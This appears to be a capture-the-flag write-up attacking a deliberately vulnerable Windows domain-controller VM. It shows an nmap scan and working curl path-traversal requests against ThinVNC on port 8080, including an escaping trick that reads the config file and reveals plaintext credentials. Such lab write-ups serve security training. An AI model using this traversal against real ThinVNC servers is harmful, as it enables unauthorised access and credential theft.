# 0. Sources

||||
|---|---|---|
|[Reddit](https://www.reddit.com/r/oscp/comments/x52uqy/i_made_another_vulnerable_vm_can_you_crack_it_and/)|[YouTube](https://www.youtube.com/watch?v=gT4XuThAlQ4)|[Download](https://drive.google.com/file/d/1uAWR1oZtpxRSAjhAONXCqUqR3wJckKy4/view)|

<details>
  <summary><h1>1. Nmap Scan</h1></summary>

┌──(root㉿kali)-[~]
└─# nmap -p- -A 10.0.88.40
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-11 09:27 +08
Nmap scan report for 10.0.88.40
Host is up (0.0014s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-12-11 01:28:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: windomain.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: WINDOMAIN)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: windomain.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc.windomain.local
| Not valid before: 2022-08-06T03:13:07
|_Not valid after:  2023-02-05T03:13:07
|_ssl-date: 2022-12-11T01:30:08+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp  open  http-proxy
|_http-title: 401 Access Denied
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Content-Type: text/html
|     Content-Length: 177
|     Connection: Keep-Alive
|     <HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>404 Not Found</H1>The requested URL nice%20ports%2C/Tri%6Eity.txt%2ebak was not found on this server.<P></BODY></HTML>
|   GetRequest:
|     HTTP/1.1 401 Access Denied
|     Content-Type: text/html
|     Content-Length: 144
|     Connection: Keep-Alive
|     WWW-Authenticate: Digest realm="ThinVNC", qop="auth", nonce="Gaiz9UHt5UBI1xcBQe3lQA==", opaque="XgshKcSfAom3vEtIe5sHCFquB6Of3K8LA8"
|_    <HTML><HEAD><TITLE>401 Access Denied</TITLE></HEAD><BODY><H1>401 Access Denied</H1>The requested URL requires authorization.<P></BODY></HTML>
| http-auth:
| HTTP/1.1 401 Access Denied\x0D
|_  Digest realm=ThinVNC opaque=Wsx6p9cWsaAsWsUaYlplA31lIqenSeIOiM nonce=xAcnAELt5UAI2xcBQu3lQA== qop=auth
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC

</details>

# 2. Checking for exploits

The target has ThinVNC on `8080`, searching for it on **Exploit-DB** returns a plausible [Authentication Bypass exploit](https://www.exploit-db.com/exploits/47519).

The exploit points to `GET`-ing the page on `http://<hostname>/xyz/../../ThinVNC.ini`

But cURL-ing it gives `404`

```console
┌──(root㉿kali)-[~]
└─# curl http://10.0.88.40:8080/xyz/../../ThinVNC.ini
<HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>404 Not Found</H1>The requested URL ThinVNC.ini was not found on this server.<P></BODY></HTML>
```

☝️ cURL and browsers collapses `../` traversals, **always double-quote the URL and escape the `/` characters**

The user/password found using a successful cURL:

```console
┌──(root㉿kali)-[~]
└─# curl "http://10.0.88.40:8080/xyz/..\/..\/ThinVNC.ini"
[Authentication]
Unicode=0
User=vagrant
Password=vagrant
Type=Digest
[Http]
Port=8080
Enabled=1
[Tcp]
Port=
[General]
AutoStart=1
```

# 3. Further attacks

Breaking into ThinVNC provides console access to the machine

The remaining attacks follow the same as [VulnDC](2022-01-10-VulnDC.md) and [VulnDC2](2022-01-17-Vulndc2.md)
